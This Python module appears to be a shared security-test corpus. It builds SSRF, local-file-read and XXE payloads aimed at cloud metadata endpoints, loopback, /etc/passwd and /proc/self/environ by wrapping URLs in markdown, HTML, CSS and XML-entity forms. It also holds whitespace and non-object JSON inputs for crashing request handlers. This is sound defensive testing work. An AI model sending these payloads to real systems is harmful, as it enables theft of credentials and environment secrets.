"""Hostile payloads and hostile shapes, shared across repos.

Two different things live here, and conflating them is how a corpus stops
covering half of what it claims to.

**Payloads** (``fetch_payloads``) are hostile *content*: a string that makes a
fetching sink fetch. They are driven by breadth -- every wrapper over every
URL -- and every one of them carries ``REFLECTION_PROBE``.

**Shapes** (``whitespace_variants``, ``NON_OBJECT_BODIES``) are hostile
*framing*: a value that is not wrong in itself but is presented so that two
layers disagree about it, and a request body that is not the type the
receiving code assumed. No amount of content breadth reaches them -- a shape
is a property of the request, not of any string inside it -- and both classes
below were found by a human reading a handler while a corpus of 63 payloads
was driven straight over the crash 63 times without noticing. See each name
for the incident it comes from.

Everything here -- payload or shape -- exists because it is a class we have
been burned by, or a class the same sink trivially extends to. The export
incident is the first two wrappers: stored markdown and stored HTML carrying
a URL into a server-side renderer.

Pair the payloads with pytest-egress-guard or the Falco rules -- the corpus
makes the attempt happen, the sensors notice it. Neither half is useful
alone. The shapes need no sensor: their finding is the 500 itself.

Shared across repos on purpose: an entry added because one repo got burned
should harden the other three the same day.

The two ``file://`` entries put the reflection probe in the URL *fragment*
(``#gdsprobe7f3a``), never in the path. A real URI parser -- which is what
``urllib.request.urlopen``, WeasyPrint's fetcher, and libxml2's XXE resolver
all use -- strips the fragment before opening anything, so the probe rides
along for a reflection check to find without changing which file gets
opened. Putting it in the path instead would corrupt the target
(``/etc/passwd/gdsprobe7f3a`` opens nothing). Known residual gap: a consumer
that slices the raw string instead of parsing it -- ``path.replace("file://",
"")``, or a regex over ``file://(.*)`` -- would try to open a literal path
with the probe suffix still attached, and fail to reach the real file. Those
18 payloads (2 ``file://`` URLs x 9 wrappers) are therefore weaker against a
naive string-slicing consumer than against a real parser. An editor adding
another ``file://`` payload should keep the probe in the fragment and accept
that gap rather than "fixing" it by moving the probe into the path.
"""

from __future__ import annotations

#: A host that resolves nowhere.  Any attempt to reach it is unambiguous, and it
#: is the hook for a self-hosted OAST callback server later.
CANARY_HOST: str = "egress-canary.invalid"

#: Present in every payload, so a reflection check is one substring search.
#: Deliberately alphanumeric: a probe containing `<` or `&` would be altered by
#: correct HTML escaping, and a reflection check would then report a false clean
#: on a response that escaped the brackets but still echoed the attacker's text.
REFLECTION_PROBE: str = "gdsprobe7f3a"

FETCH_URLS: tuple[str, ...] = (
    f"http://169.254.169.254/latest/meta-data/{REFLECTION_PROBE}",   # cloud metadata
    f"http://[::ffff:169.254.169.254]/{REFLECTION_PROBE}",           # same, IPv6-mapped
    f"http://127.0.0.1:5002/healthz?{REFLECTION_PROBE}",             # loopback to self
    f"http://internal-service.local/{REFLECTION_PROBE}",             # cluster-internal name
    f"http://{CANARY_HOST}/{REFLECTION_PROBE}",                      # unique canary
    f"file:///etc/passwd#{REFLECTION_PROBE}",                        # LFI
    f"file:///proc/self/environ#{REFLECTION_PROBE}",                 # LFI, env secrets
)

WRAPPERS: tuple[str, ...] = (
    "{url}",
    "![x]({url})",                                    # markdown image
    "[click]({url})",                                 # markdown link
    '<img src="{url}">',
    '<iframe src="{url}"></iframe>',
    '<object data="{url}"></object>',
    '<link rel="stylesheet" href="{url}">',
    '<style>@import url("{url}");</style>',           # CSS fetch in a renderer
    '<!DOCTYPE r [<!ENTITY x SYSTEM "{url}">]><r>&x;</r>',   # XXE
)


def fetch_payloads() -> tuple[str, ...]:
    """Return every wrapper applied to every URL.

    Google-style: no args, returns the cross product of ``WRAPPERS`` and
    ``FETCH_URLS`` so a caller gets one flat tuple of ready-to-send payloads
    rather than having to nest the loop itself.

    Returns:
        The cross product of ``WRAPPERS`` and ``FETCH_URLS``, wrapper-major
        (all URLs for a wrapper before moving to the next wrapper), as a tuple
        of length ``len(WRAPPERS) * len(FETCH_URLS)``.
    """
    return tuple(w.format(url=u) for w in WRAPPERS for u in FETCH_URLS)


#: Whitespace appended to an otherwise valid value.
#:
#: ``re.match(r"^...$", value)`` is the guard idiom this defeats. Python's
#: ``$`` matches before a trailing newline; the rust regex engine behind
#: pydantic-core's ``pattern`` does not, and neither does Postgres's
#: ``uuid_in``. So a ``$``-anchored guard hands a value downstream that the
#: next layer refuses, and the refusal surfaces as a 500 rather than as the
#: 400 the guard was written to produce. AIRE carried six such patterns and
#: ``DELETE /filesystem/bulk/delete`` crashed on exactly this -- while the
#: attack plane drove that route 63 times without ever sending a valid value
#: at all, because a *content* corpus has no valid value to suffix.
#:
#: ``\u00a0`` (non-breaking space) is here because it is whitespace to
#: ``str.strip()`` and to ``\s`` under ``re.UNICODE`` (Python's default for
#: ``str`` patterns), but not to a byte-oriented parser -- so it splits the
#: two layers apart in the opposite direction from ``\n``.
TRAILING_WHITESPACE: tuple[str, ...] = ("\n", "\r\n", "\t", " ", "\u00a0")

#: The same class from the other end. A leading space defeats no ``$`` anchor,
#: but it defeats every guard that compares against a whitelist or looks a
#: value up in a dict before a later layer strips it.
LEADING_WHITESPACE: tuple[str, ...] = (" ", "\n")


def whitespace_variants(value: str) -> tuple[str, ...]:
    """Return ``value`` framed in each way two layers can disagree about.

    The caller supplies the value because only the caller knows what is valid
    in its application: a live seeded UUID, a real node id, an enum member the
    handler accepts. That is the whole point of this being a function rather
    than a tuple of literals -- the class needs a *valid* value to corrupt,
    and a shared corpus has none.

    Args:
        value: A value the application under test accepts as-is.

    Returns:
        ``value`` with each entry of ``TRAILING_WHITESPACE`` appended and each
        entry of ``LEADING_WHITESPACE`` prepended, deduplicated and in a
        stable order so a run is reproducible. Never contains ``value``
        itself: a variant identical to the input would test nothing and would
        make a "did any variant behave differently" comparison vacuous.
    """
    variants = [value + suffix for suffix in TRAILING_WHITESPACE]
    variants += [prefix + value for prefix in LEADING_WHITESPACE]
    seen: dict[str, None] = {}
    for variant in variants:
        if variant != value:
            seen.setdefault(variant, None)
    return tuple(seen)


#: Request bodies that are valid JSON but not JSON objects.
#:
#: ``request.get_json(silent=True) or {}`` is the idiom this defeats, and it
#: appears in every Flask handler that reads an optional body. The ``or {}``
#: rescues ``null`` and ``[]`` -- both falsy -- and rescues nothing else: a
#: non-empty array, a bare string, a number and ``true`` are all truthy, so
#: they survive the guard and the next ``body.get(...)`` raises
#: ``AttributeError``. That is a 500 on an unauthenticated-reachable route in
#: the general case. AIRE's ``DELETE /filesystem/bulk/delete`` was one.
#:
#: The falsy entries are kept anyway, and deliberately: they assert that the
#: ``or {}`` rescue is actually present. A route that 500s on ``null`` has a
#: different bug -- it read the body without the guard at all.
#:
#: A route whose body is validated by a schema should answer 422 to every one
#: of these. A route with no schema -- the ones a schema-coverage waiver names
#: as "no request body" -- is where the crash lives, because nothing between
#: the socket and the handler ever checked the type.
NON_OBJECT_BODIES: tuple[object, ...] = (
    [{"id": REFLECTION_PROBE}],
    [REFLECTION_PROBE],
    REFLECTION_PROBE,
    7,
    True,
    [],
    None,
)
